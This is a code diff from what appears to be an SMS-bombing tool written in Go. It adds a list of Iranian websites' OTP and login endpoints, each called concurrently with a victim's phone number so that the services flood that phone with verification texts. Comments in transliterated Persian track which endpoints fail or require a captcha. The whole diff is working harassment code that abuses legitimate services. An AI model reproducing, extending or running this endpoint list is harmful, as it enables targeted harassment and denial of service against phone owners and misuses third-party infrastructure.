@@ -126,9 +126,9 @@ func main() {
 		go sms("https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // add site
-		go sms("https://api.torob.com/v4/user/phone/send-pin/?phone_number=09122221212&source=next_desktop", map[string]interface{}{
+		go sms("https://api.torob.com/v4/user/phone/send-pin/?phone_number=phone&source=next_desktop", map[string]interface{}{
 			"phone_number": phone,
-		}, ch)   // add site
+		}, ch)   // add site   moshkel dareh❌❌❌ hamchenin in site neshan.org & technolife.com
 		go sms("https://api.torobpay.com/user/v1/login/", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)   // add site
@@ -153,32 +153,32 @@ func main() {
 		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
 			"identifier": phone,
 		}, ch)   // add site
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
+			"phone_number": phone,
 		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+		go sms("https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", map[string]interface{}{
+			"phone": phone,
 		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+		go sms("https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", map[string]interface{}{
+			"mobile": phone,
 		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+		go sms("https://nazarkade.com/wp-admin/admin-ajax.php", map[string]interface{}{
+			"mobileNo": phone,
 		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+		go sms("https://api.motabare.ir/v1/core/user/initial/", map[string]interface{}{
+			"mobile": phone,
+		}, ch) // chaptcha
+		go sms("https://api.baloan.ir/api/v1/accounts/login-otp", map[string]interface{}{
+			"phone_number": phone,
+		}, ch) // juft login
+		go sms("https://api.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
+			"cellNumber": phone,
 		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+		go sms("https://www.e-estekhdam.com/panel/users/authenticate/start?redirect=/search", map[string]interface{}{
+			"username": phone,
 		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch)
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+		go sms("https://emp.e-estekhdam.com/users/authenticate/start?redirect=/", map[string]interface{}{
+			"username": phone,
 		}, ch)
 
 
